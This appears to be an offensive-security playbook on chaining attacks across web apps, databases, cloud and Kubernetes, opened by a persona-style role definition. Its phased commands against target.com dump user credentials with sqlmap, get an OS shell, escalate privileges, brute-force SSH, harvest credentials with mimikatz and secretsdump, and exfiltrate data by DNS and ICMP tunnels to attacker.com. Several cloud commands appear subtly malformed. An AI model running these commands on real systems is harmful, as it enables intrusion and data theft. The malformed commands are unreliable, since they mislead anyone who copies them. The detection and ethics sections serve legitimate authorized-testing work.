# Multi-Platform Attack Chains: Cross-Technology Stack Exploitation

## Expert Role Definition
You are a multi-platform security researcher specializing in identifying and chaining vulnerabilities across diverse technology stacks, operating systems, and cloud environments. Your expertise spans web applications, mobile platforms, cloud infrastructure, databases, and network protocols. You understand how vulnerabilities in one platform can be leveraged to compromise entirely different systems through trust relationships, shared credentials, and interconnected architectures. You operate in authorized security assessments and bug bounty programs, providing comprehensive cross-platform attack analysis.

## Core Concepts
Multi-platform attack chains exploit the interconnected nature of modern IT environments. Organizations rarely operate in isolation; web applications connect to APIs, which connect to databases, which reside in cloud infrastructure, which interacts with mobile applications. This interconnectedness creates attack paths that span multiple technology boundaries.

The fundamental principle is trust propagation across platforms. A web application vulnerability may yield database credentials, which may be reused on cloud consoles, which may provide access to container orchestration systems. Each platform transition represents an opportunity for privilege escalation, persistence, and lateral movement.

Cross-platform exploitation requires understanding multiple technology stacks simultaneously. Attackers must be proficient in web exploitation (OWASP Top 10), database attack techniques (SQL injection, NoSQL injection), cloud security (AWS, Azure, GCP), mobile security (iOS, Android), and network protocols (DNS, HTTP, SSH, RDP).

The attack surface expands exponentially with each platform integration. A single misconfigured API endpoint can expose database credentials, which may lead to cloud storage access, which may contain container images with embedded secrets, which may provide Kubernetes cluster admin access.

## Pre-requisite Knowledge
Before executing multi-platform attacks, understand: web application security (authentication, authorization, session management), database systems (relational and NoSQL), cloud platforms (AWS, Azure, GCP services and IAM), containerization (Docker, Kubernetes), network protocols (TCP/IP, DNS, HTTP/HTTPS), mobile platforms (iOS security model, Android permissions and sandboxing), and identity providers (OAuth, SAML, OIDC).

Knowledge of API security (REST, GraphQL, WebSocket), infrastructure as code (Terraform, CloudFormation), CI/CD systems (GitHub Actions, Jenkins), and monitoring/logging systems provides the foundation for comprehensive multi-platform attacks. Understanding of credential management, secret rotation, and access control mechanisms is essential.

## Chain Architecture / Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                MULTI-PLATFORM ATTACK CHAIN                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐          │
│  │  Web App     │    │  Mobile App  │    │  API Layer   │          │
│  │  (Frontend)  │◀──▶│  (iOS/       │◀──▶│  (REST/      │          │
│  │              │    │   Android)   │    │   GraphQL)   │          │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘          │
│         │                    │                    │                  │
│         │         ┌─────────▼─────────┐         │                  │
│         │         │  Shared Identity  │         │                  │
│         │         │  (OAuth/SAML)     │         │                  │
│         │         └─────────┬─────────┘         │                  │
│         │                    │                    │                  │
│  ┌──────▼───────┐    ┌──────▼───────┐    ┌──────▼───────┐          │
│  │  Database    │    │  Cloud       │    │  Container   │          │
│  │  (MySQL/     │◀──▶│  (AWS/Azure/ │◀──▶│  (Docker/    │          │
│  │   MongoDB)   │    │   GCP)       │    │   K8s)       │          │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘          │
│         │                    │                    │                  │
│         │    ┌───────────────▼───────────────┐    │                  │
│         │    │      LATERAL MOVEMENT         │    │                  │
│         │    │                               │    │                  │
│         └───▶│  1. Web App → DB Credentials  │◀───┘                  │
│              │  2. DB → Cloud Console Access  │                     │
│              │  3. Cloud → Container Registry │                     │
│              │  4. Container → K8s Cluster    │                     │
│              │  5. K8s → Production Systems   │                     │
│              └───────────────┬───────────────┘                     │
│                              │                                     │
│  ┌───────────────────────────▼───────────────────────────┐         │
│  │                FULL ENVIRONMENT COMPROMISE            │         │
│  │  • Web application control                            │         │
│  │  • Database access and manipulation                   │         │
│  │  • Cloud infrastructure control                       │         │
│  │  • Container orchestration compromise                 │         │
│  │  • Data exfiltration across all platforms             │         │
│  └───────────────────────────────────────────────────────┘         │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

## Step-by-Step Exploitation Methodology

### Phase 1: Web Application Reconnaissance and Exploitation
Map application architecture, identify technology stack, and discover vulnerabilities:

```bash
# Technology fingerprinting
whatweb https://target.com
httpx -u https://target.com -tech-detect

# API endpoint discovery
katana -u https://target.com -d 3 -jc -o urls.txt
grep -E "(api|graphql|rest)" urls.txt

# Vulnerability scanning
nuclei -u https://target.com -t cves/ -severity critical,high
sqlmap -u "https://target.com/api?id=1" --batch --dbs
```

### Phase 2: Credential Extraction
Extract credentials from web application vulnerabilities:

```bash
# SQL injection for credential extraction
sqlmap -u "https://target.com/api?id=1" --dump -T users -C username,password,email

# API parameter tampering for privilege escalation
curl -X POST https://target.com/api/admin/update \
  -H "Authorization: Bearer <token>" \
  -d '{"user_id":1,"role":"admin"}'

# Session token extraction
python3 session_extract.py --url https://target.com --cookie jar.txt
```

### Phase 3: Cloud Platform Access
Use extracted credentials to access cloud platforms:

```bash
# AWS credential validation
aws sts get-caller-identity --access-key_id <AKIA...> --secret-access-key <secret>

# Azure credential validation
az login --service-principal -u <app_id> -p <secret> --tenant <tenant_id>

# GCP credential validation
gcloud auth activate-service-account --key-file=service-account.json

# Cloud enumeration
pacu --module-name iam__enum_users --options '{}'  # AWS enumeration
 ScoutSuite --provider aws  # Multi-cloud security assessment
```

### Phase 4: Container and Kubernetes Exploitation
Access container registries and orchestration systems:

```bash
# Docker registry enumeration
curl -s https://registry.target.com/v2/_catalog | jq .
docker login registry.target.com -u <user> -p <pass>

# Kubernetes API access
kubectl --server=https://k8s.target.com --token=<token> get pods --all-namespaces
kubectl --kubeconfig=config.yaml get secrets -A

# Container image analysis
skopeo inspect docker://registry.target.com/image:latest
trivy image registry.target.com/image:latest
```

### Phase 5: Cross-Platform Lateral Movement
Leverage access across platforms for comprehensive compromise:

```python
# Multi-platform lateral movement
def cross_platform_attack(credentials):
    # Web app to database
    db_access = exploit_web_to_db(credentials['web_creds'])
    
    # Database to cloud
    cloud_access = extract_cloud_creds_from_db(db_access)
    
    # Cloud to container registry
    registry_access = access_container_registry(cloud_access)
    
    # Container registry to Kubernetes
    k8s_access = exploit_container_to_k8s(registry_access)
    
    # Kubernetes to production
    production_access = lateral_move_via_k8s(k8s_access)
    
    return full_environment_compromise(production_access)
```

## Tool Arsenal

```bash
# Web application testing
sqlmap -u "URL?id=1" --batch --risk=3 --level=5
nikto -h https://target.com -output report.html
burpsuite  # Manual testing and automation

# API testing
postman  # API testing and automation
arjun -u https://target.com/api/endpoint  # Parameter discovery
ffuf -u https://target.com/api/FUZZ -w wordlist.txt -mc 200

# Cloud security testing
pacu --module-name iam__privesc_scan  # AWS privilege escalation
ScoutSuite --provider aws  # Cloud security assessment
CloudSploit  # Cloud security scanning

# Container security
trivy image <image:tag>  # Container vulnerability scanning
grype <image:tag>  # Container vulnerability scanning
kube-hunter  # Kubernetes penetration testing
kubeaudit  # Kubernetes security auditing

# Database testing
sqlmap -u "URL?id=1" --os-shell  # OS execution via SQL injection
nosqlmap -u https://target.com/api  # NoSQL injection testing

# Network pivoting
ssh -D 1080 user@target  # SOCKS proxy
proxychains nmap -sT target.com  # Network scanning through proxy
chisel client target:8080  # Reverse SOCKS proxy

# Credential harvesting
laZagne  # Local credential extraction
mimikatz  # Windows credential extraction
secretsdump.py  # Remote credential extraction
```

## Real-World Case Studies

### Operation Aurora (2010)
Attackers compromised Google and 32 other companies through a multi-platform chain starting with spear-phishing emails containing zero-day Internet Explorer exploits. The initial web browser compromise led to network reconnaissance, lateral movement across Windows domains, and ultimately theft of intellectual property and Gmail account data. The operation demonstrated how a single web-based initial access point can cascade through an entire corporate network.

### APT1 Chinese Espionage Campaign (2013)
Mandiant documented APT1's multi-stage attack methodology: spear-phishing with weaponized documents (web/email vector), initial foothold establishment, credential harvesting, lateral movement via RDP and shared drives, and systematic data exfiltration. The campaign targeted 141 companies across 20 industries, demonstrating how web-based initial access enables comprehensive organizational compromise through multi-platform lateral movement.

### NotPetya Destructive Attack (2017)
The NotPetya malware demonstrated cross-platform destructive capabilities: initial infection via M.E.Doc software update (supply chain attack), credential harvesting via Mimikatz, lateral movement via EternalBlue (SMB) and credential reuse, and destructive encryption of Windows systems. The attack caused $10 billion in damages across multiple countries and industries, demonstrating how multi-platform chaining can achieve devastating impact.

### SolarWinds Supply Chain Attack (2020)
Attackers compromised SolarWinds Orion build system, injecting backdoors into software updates. The trojanized DLL enabled initial access to target networks, followed by lateral movement using stolen credentials, SAML token forgery for persistence, and data exfiltration via cloud services. The attack compromised 18,000 organizations including US government agencies, demonstrating multi-platform chaining across development, build, deployment, and production environments.

## Bypass Techniques and Evasion

### Cross-Platform Credential Reuse
Exploit credential reuse across platforms:
```python
# Test credentials across multiple platforms
def test_credential_reuse(username, password):
    platforms = {
        'ssh': ssh_connect(target, username, password),
        'rdb': mysql_connect(db_host, username, password),
        'aws': aws_login(access_key, secret_key),
        'docker': docker_login(registry, username, password),
        'k8s': kubectl_auth(token)
    }
    return {p: result for p, result in platforms.items() if result}
```

### Protocol Tunneling
Tunnel traffic across protocols to bypass network controls:
```bash
# DNS tunneling for data exfiltration
dnscat2-server attacker.com
dnscat2 target.com

# HTTP tunneling
ngrok http 8080  # Expose local services
frp  # Fast reverse proxy

# ICMP tunneling
ptunnel -p attacker.com -lp 8080 -da target.com -dp 22
```

### Authentication Token Abuse
Reuse authentication tokens across platform boundaries:
```bash
# OAuth token reuse
curl -H "Authorization: Bearer <token>" https://api.target.com/user
curl -H "Authorization: Bearer <token>" https://cloud.target.com/api

# SAML token replay
python3 saml_replay.py --assertion <assertion> --acs-url https://target.com/acs

# JWT token manipulation
jwt_tool <token> -M at  # Algorithm confusion attack
```

### Identity Provider Abuse
Exploit SSO and federation relationships:
```python
# SSO abuse across platforms
def sso_abuse(session_token):
    # Access primary platform
    primary_access = access_platform(session_token)
    
    # Enumerate federated platforms
    federated_platforms = discover_federated_sso(primary_access)
    
    # Attempt token exchange
    for platform in federated_platforms:
        platform_access = attempt_sso_federation(session_token, platform)
        if platform_access:
            return platform_access
```

## Defensive Indicators / Detection

### Cross-Platform Access Monitoring
Monitor for access patterns spanning multiple platforms from single identity:
- Multiple authentication events from same IP across different services
- Unusual geographic distribution of authentication events
- Credential usage across unrelated systems
- Token reuse across platform boundaries

### Anomalous API Usage
Detect unusual API patterns indicating cross-platform exploitation:
- High-volume API calls from single identity
- Access to unusual resource combinations
- API calls outside normal business hours
- Requests to deprecated or rarely-used endpoints

### Lateral Movement Indicators
Monitor for lateral movement patterns:
- New service connections from previously inactive accounts
- Privilege escalation requests
- Access to sensitive resources from unusual sources
- Unusual network connections between internal services

## Impact Assessment Framework

### Scope Analysis
Map all affected platforms and their interconnections. Consider data flows, trust relationships, and credential reuse patterns. Identify critical systems and crown jewel assets at risk.

### Data Exposure Assessment
Evaluate what data was accessible across all compromised platforms. Consider PII, intellectual property, financial data, and credentials. Assess cross-platform data exposure amplification.

### Lateral Movement Impact
Quantify the blast radius of cross-platform credential reuse. Calculate potential for further compromise based on trust relationships and access patterns.

### Recovery Complexity
Assess recovery requirements across all affected platforms. Consider credential rotation, access revocation, monitoring enhancement, and incident response coordination across teams.

## Common Pitfalls and Anti-Patterns

### Platform Silos
Treating each platform as isolated security domain ignores cross-platform attack paths. Organizations must adopt holistic security views that consider interconnections between systems.

### Inadequate Credential Management
Static credentials, shared passwords, and infrequent rotation enable cross-platform lateral movement. Implement centralized credential management with automatic rotation.

### Missing Network Segmentation
Flat network architectures allow attackers to pivot freely between platforms. Implement network segmentation with strict access controls between environments.

### Insufficient Monitoring
Platform-specific monitoring misses cross-platform attack patterns. Deploy centralized logging and correlation across all platforms for comprehensive detection.

## Advanced Variations

### Hybrid Cloud Exploitation
Chain vulnerabilities across on-premises and cloud environments. Exploit hybrid cloud configurations where local Active Directory integrates with cloud identity providers.

### IoT and OT Integration
Extend multi-platform chains to IoT devices and operational technology. Exploit weak authentication in IoT devices to access enterprise networks, then pivot to IT systems.

### Multi-Cloud Attacks
Chain vulnerabilities across multiple cloud providers (AWS, Azure, GCP). Exploit federated identity configurations and cross-cloud service integrations.

### Edge Computing Exploitation
Target edge computing platforms (CDNs, edge functions, IoT gateways) as pivot points for broader network compromise. Exploit trust relationships between edge and core systems.

## Integration with Other Chains

### Supply Chain to Multi-Platform
Combine supply chain compromise with multi-platform lateral movement. Use compromised development tools to access build systems, then pivot to production infrastructure across platforms.

### Zero-Day to Multi-Platform
Use zero-day vulnerabilities as initial access points for multi-platform chains. Leverage unpatched vulnerabilities to establish footholds that enable cross-platform lateral movement.

### Social Engineering to Multi-Platform
Chain social engineering attacks (phishing, pretexting) with technical exploitation across platforms. Use stolen credentials to access multiple systems and escalate privileges.

### APT Multi-Platform Operations
Integrate multi-platform chains into advanced persistent threat operations. Combine web, mobile, cloud, and on-premises exploitation for comprehensive target compromise.

## Reporting and Documentation

### Cross-Platform Attack Documentation
Document attack paths across all affected platforms with clear visualization. Include platform-specific exploitation details and interconnection mappings.

### Credential Impact Analysis
Map all compromised credentials and their scope of access across platforms. Document credential reuse patterns and cross-platform impact.

### Platform-Specific Recommendations
Provide tailored recommendations for each affected platform. Include platform-specific hardening guidance and monitoring improvements.

### Holistic Security Assessment
Deliver comprehensive security assessment considering all platforms as interconnected system. Include architectural recommendations for reducing cross-platform attack surface.

## Practice Labs and Exercises

### Multi-Platform Lab Setup
Build lab environments with web applications, databases, cloud services, and container orchestration. Practice exploiting vulnerabilities across platform boundaries.

### Cross-Platform Credential Reuse
Set up identical credentials across multiple platforms and practice lateral movement. Understand how credential reuse enables multi-platform compromise.

### API Security Testing
Practice testing API security across REST, GraphQL, and WebSocket interfaces. Understand how API vulnerabilities cascade to backend systems.

### Container and Kubernetes Security
Deploy vulnerable container environments and practice container escape, Kubernetes API exploitation, and cluster compromise techniques.

## Ethical Guidelines

### Authorized Testing Only
Conduct multi-platform testing only against systems with explicit authorization. Obtain separate authorization for each platform being tested as needed.

### Cross-Platform Impact Awareness
Understand how testing activities on one platform may affect interconnected systems. Coordinate testing to prevent unintended impact on production systems.

### Comprehensive Disclosure
Report vulnerabilities across all affected platforms. Coordinate disclosure with multiple vendors when vulnerabilities span different technology stacks.

### Responsible Lateral Movement
Document all lateral movement paths discovered during testing. Provide recommendations for breaking dangerous trust relationships between platforms.

## Quick Reference Cheat Sheet

```bash
# Web to database extraction
sqlmap -u "URL?id=1" --dump -T users --threads=5

# Cloud credential validation
aws sts get-caller-identity --access-key <AKIA> --secret-key <secret>

# Container registry access
curl -s https://registry.target.com/v2/_catalog | jq .

# Kubernetes API enumeration
kubectl --token=<token> get pods --all-namespaces -o json | jq '.items[].metadata.namespace'

# Credential reuse testing
hydra -l admin -P passwords.txt ssh://target.com

# API parameter discovery
arjun -u https://target.com/api/endpoint -m JSON

# Network pivoting
ssh -D 1080 user@target && proxychains nmap -sT 10.0.0.0/24

# Cross-platform monitoring
auditd -k cross_platform  # Linux audit rules
Sysmon -i config.xml  # Windows system monitoring

# Multi-platform credential rotation
aws iam rotate-access-key --user-name <user> --access-key <key>
az ad sp credential reset --id <app-id>
gcloud iam service-accounts keys rotate <key-id> --iam-account <sa>

# Centralized logging
elasticsearch  # Central log storage
kibana  # Log visualization and correlation
splunk  # Security information and event management
```
